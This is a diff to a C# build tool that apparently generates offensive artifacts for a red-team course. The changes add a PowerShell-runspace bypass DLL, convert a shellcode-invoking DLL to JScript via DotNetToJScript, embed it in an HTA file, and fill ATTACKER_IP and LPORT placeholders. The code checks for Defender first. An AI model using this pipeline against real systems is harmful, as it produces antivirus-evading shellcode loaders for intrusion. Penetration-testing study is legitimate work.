@@ -185,6 +185,7 @@ namespace Build
             artifacts.Add(new Artifact("DLL Execute Assembly Dynamic", "ea-dy.dll", ArtifactType.Bypass));
             artifacts.Add(new Artifact("DLL Execute Assembly Static", "ea-st.dll", ArtifactType.Bypass));
             artifacts.Add(new Artifact("DLL Invoke Shellcode", "invoke-sc.dll", ArtifactType.Fundamental));
+            artifacts.Add(new Artifact("DLL Native PowerShell Runspace Static", "native-ps-rs-st.dll", ArtifactType.Bypass));
             artifacts.Add(new Artifact("DLL PowerShell Runspace Dynamic", "ps-rs-dy.dll", ArtifactType.Bypass));
             artifacts.Add(new Artifact("DLL PowerShell Runspace Reflection Dynamic", "ps-rs-rf-dy.dll", ArtifactType.Bypass));
             artifacts.Add(new Artifact("DLL PowerShell Runspace Reflection Static", "ps-rs-rf-st.dll", ArtifactType.Bypass));
@@ -414,15 +415,25 @@ namespace Build
             //DotNetToJsTemplates
             if (!IsDefenderRealTimeProtectionEnabled())
             {
+                Console.WriteLine("*** Starting DotNet 2 Jscript ***");
                 string dn2js_location = $"{args[0]}\\DotNetToJScript\\bin\\x64\\DotNetToJScript.exe";
                 string dll_location = $"{args[0]}\\ARTIFACTS\\Fundamental\\DLL invoke Shellcode\\x64\\invoke-sc.dll";
                 string out_location = $"{args[0]}\\ARTIFACTS\\scripts\\rundll_invokable.js";
                 string cmdline = $"{dn2js_location} \"{dll_location}\" --lang=Jscript --ver=v4 -o \"{out_location}\" -c OSEP.OSEPRunner";
+                Console.WriteLine(cmdline);
                 RunProccess(cmdline);
+
+
+
+                //build hta files
+                string js = File.ReadAllText($"{args[0]}\\ARTIFACTS\\scripts\\rundll_invokable.js");
+                string tmp = File.ReadAllText($"{args[0]}\\templates\\invoke_dll.hta");
+                string result = tmp.Replace("{JSCODE}", js);
+                File.WriteAllText($"{args[0]}\\ARTIFACTS\\scripts\\invoke_dll.hta",result);
             }
             else
             {
-                //Console.WriteLine("\nWARNING: MS DEFENDER is enabled. DotNetToJScript will not run...");
+                Console.WriteLine("\nWARNING: MS DEFENDER is enabled. DotNetToJScript will not run...");
             }
                
         }
@@ -538,8 +549,10 @@ namespace Build
                 output = output.Replace("{POWERSHELL_SCRIPT_NAME}", CONFIG.POWERSHELL_SCRIPT_NAME);
                 output = output.Replace("{SHELLCODE_NAME}", CONFIG.SHELLCODE_NAME);
                 output = output.Replace("{INSTALL_UTIL_EXE_PATH}", CONFIG.INSTALL_UTIL_EXE_PATH);
+                output = output.Replace("{ATTACKER_IP}", CONFIG.ATTACKER_IP);
+                output = output.Replace("{LPORT}", CONFIG.LPORT);
 
-                
+
 
                 //This block should only run once in theory.
                 if (!FunctionsAdded)
